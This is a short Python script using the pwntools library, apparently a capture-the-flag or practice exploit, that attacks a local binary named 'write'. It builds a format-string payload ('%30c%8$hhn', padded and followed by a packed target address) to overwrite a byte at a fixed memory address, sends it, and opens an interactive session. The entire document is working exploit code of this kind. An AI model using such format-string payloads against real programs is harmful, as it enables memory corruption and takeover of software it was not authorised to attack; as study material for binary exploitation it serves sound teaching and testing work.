from pwn import *
context.log_level = "debug"
p = process("./write")
a_addr = 0x601048

payload = "%30c%8$hhn"
payload = payload.ljust(16,"c")
payload += p64(a_addr)

p.sendline(payload)
p.interactive()

